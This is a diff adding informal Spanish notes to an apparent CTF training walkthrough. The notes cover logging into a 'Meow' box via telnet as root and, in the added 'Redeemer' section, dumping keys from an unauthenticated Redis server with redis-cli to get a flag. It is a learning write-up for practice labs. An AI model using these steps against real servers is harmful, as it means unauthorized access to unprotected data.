@@ -49,3 +49,25 @@ El sáb, 23 abr 2022 a las 11:11, David Yanes Fariña (<davidyanesfarina@gmail.c
     telnet
     root
     Se conecta con telnet a Meown y con user/pass root se obtiene el flag.txt
+    
+    
+    
+    
+REDEEMER
+--------
+
+redis-cli -h
+
+> info
+
+> select 0
+
+keys *
+
+get tmp
+get stor
+get numb
+glet flag
+
+
+    
